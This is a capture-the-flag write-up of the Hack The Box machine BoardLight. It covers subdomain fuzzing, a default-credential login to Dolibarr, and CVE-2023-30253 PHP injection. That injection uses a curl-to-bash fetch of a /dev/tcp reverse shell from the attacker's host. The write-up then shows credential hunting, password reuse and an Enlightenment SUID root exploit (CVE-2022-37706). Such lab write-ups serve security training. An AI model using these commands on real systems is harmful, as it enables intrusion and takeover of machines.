---
title: "HTB Writeup: BoardLight"
author: xpnt
date: 2024-05-27
image:
  path: https://pbs.twimg.com/media/GORoUi8XkAAzjsL?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 5: Anomalies"]
tags: [labs,Dolibarr,Enlightenment,default_credentials,ffuf]
---

 [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/603)

# WriteUp

# User

- The pentester starts with a port scan and discovers that the ports `22,80` are open.

```bash
# Nmap 7.94SVN scan initiated Mon May 27 19:30:34 2024 as: nmap -sCV -p22,80 -n -Pn -v -oN scanPorts 10.129.67.131
Nmap scan report for 10.129.67.131
Host is up (2.3s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 27 19:30:55 2024 -- 1 IP address (1 host up) scanned in 21.78 seconds
```


- Due to there not being any interesting exploits for the version of `OpenSSH 8.2`, and the pentester not having credentials for the service, port `80` looks much more interesting to be analyzed for vulnerabilities.

- The pentester noticed that the website on port `80` belongs to `BoardLight`, which is a cybersecurity consulting firm. After inspecting the website thoroughly, he didn't discover any vulnerable functionality. However, he noticing a possible domain name for the website: `board.htb`

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240527184645.png)

- As a result, the pentester attempted to search for some subdomain. To do this, he first added the domain to the file `/etc/hosts` using the following command.

```bash
sudo tee -a /etc/hosts <<< "10.129.67.131 board.htb"
```

- Then the pentester conducted subdomain fuzzing with the tool `ffuf` using the following command, aiming to encounter a subdomain. 
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -ic -t 200 -c -fs 15949
```

>Comments:
>Something worth mentioning is that the tool '`ffuf`', (similar to the '`Burp Suite`' proxy), performs a character count, which is represented in the 'size' field of the output. This can be observed in line 200 of the Go code in the file `('simple.go')` available at: [simple.go](https://github.com/ffuf/ffuf/blob/master/pkg/runner/simple.go)
>![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528080604.png)
>In order to discover the new subdomain, it's necessary to filter the `size` field. This is required because for _non-existent subdomains_, the response code will remain `200 OK`, and it will display the default response content of the `board.htb` domain. To calculate the `fs` corresponding to `board.htb`, you just need to use the following command.
```bash
curl -s http://board.htb | wc -c
# 15949
```
>It's worth noting that the same information could have been obtained by passing the request through the `'Burp Suite'` proxy, where it would be available in the response header `'Content-Length'`, or by inspecting the `Network tab` in your preferred browser, as illustrated in the following image.
>![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528082500.png)
>![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528082823.png)
{: .prompt-info }

- Great! The pentester discovered the subdomain `crm.board.htb` as a result, he added this subdomain in the `/etc/hosts` file and proceeded to conduct further analysis of this new subdomain.

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 176ms]
```

- Upon accessing the subdomain `crm.board.htb`, the pentester noticed that it is running the service `Dolibarr (17.0.0)`. A quick search for vulnerabilities associated with this service allowed the pentester to discover the following CVE: [`PHP Code Injection (CVE-2023-30253)`](https://www.swascan.com/security-advisory-dolibarr-17-0-0/). This vulnerability fundamentally consists of being able to bypass security controls that prohibit an unprivileged user from adding or editing PHP dynamic content (generally, these actions are restricted to `developers`). However, this vulnerability not only allows this but also circumvents the `blacklist` of certain dangerous PHP functions (commands) such as `system`, `exec`, etc., ultimately allowing Remote Code Execution (RCE).

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528114950.png)

- To exploit this vulnerability, authentication in `Dolibarr` is required. A quick search for default credentials of this software yields the following: `admin:admin`.

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528085557.png)

- He tried to access with those credentials. Boom! He could authenticate in Dolibarr. However, to exploit this vulnerability, it is necessary to have access to a `page` belonging to a `website` in order to modify the source code. Unfortunately, there isn't one available. Therefore, I created a website with the following steps.

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528090140.png)

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528090205.png)

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528090233.png)

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528090321.png)

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528090725.png)

- He modified the source code with the following content in order to see if it's possible to exploit the vulnerability

```php
<?PhP echo "Testing" . ": CVE-2023-30253";?>
```


![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528091216.png)

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528091513.png)

- So in order to receive a reverse shell, he hosted the following `pwn.html` file on an HTTP server, with the following content:

```
bash -i>&/dev/tcp/10.10.14.80/4444 0>&1
```

- And then, he executed the following PHP code. 

```php
<?PHP system("curl -s http://10.10.14.80/pwn.html|bash");?>
```

- Nice!! He retrieved a reverse shell and then he established that.

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528092324.png)

- Since he had access to the server as the user `www-data`, he attempted to search for `connection strings` or `hardcoded credentials` in some files. For this purpose, he executed the following commands.

```bash
grep -arin 'DB_USER\|DB_PASSWORD' |awk -F':' '{print $1}' | sort | uniq -c
```

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528103045.png)

- After reviewing those files, the pentester found a password (`serverfun2$2023!!`) for the `mysql` service.

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528103704.png)

- The user enumeration reveals the existence of the user `larissa`.

```bash
grep -P ".*sh$" /etc/passwd
```

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528103927.png)

- Assuming there is credential reuse, the pentester attempted to switch to the user `larissa`, which was discovered earlier. Success! Now they have switched to the user `larissa` and read the file `/home/larissa/user.txt`.

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528104337.png)

# Root

- Once access as the user `larissa` is obtained, the pentester continues the enumeration to escalate privileges to root, now with the new privileges and permissions acquired for this user. They search for `SUID binaries` and identify non-common binaries with `SUID permission`, especially those related to `enlightenment`.

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
 
>Tip: It is necessary to emphasize these binaries further, as curiously, the SUID permissions are applied to binaries related to `EnLIGHTenment` (which is one of the main window managers of Linux), which has a certain relationship with the machine name (`BoardLIGHT`).
>![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528105515.png)
{: .prompt-tip }

- A quick search for vulnerabilities related to the `Enlightenment (desktop environment)` software led us to discover the [`CVE-2022-37706`](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) discovered by [MaherAzzouzi](https://github.com/MaherAzzouzi), which allows privilege escalation to root user. Essentially, this [`CVE-2022-37706`](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) consists of a `command injection` exploiting the `logical bug` caused by repeated calls to the `eina_strbuf_append_printf()` function. An excellent explanation can be found on the GitHub page of [MaherAzzouzi](https://github.com/MaherAzzouzi). Therefore, the pentester used that Proof of Concept (PoC) for privilege escalation.

```bash
mkdir /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/bash" > /tmp/exploit
chmod a+x /tmp/exploit
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

- Finally, he executed this Proof of Concept (PoC) and succeeded! The pentester was able to read the file `/root/root.txt`.

![](/assets/images/HTB-Writeup-BoardLight/Pasted image 20240528113816.png)


>I hope you had as much fun reading this write up as I did writing it. Happy Hacking!!👾
{: .prompt-tip }
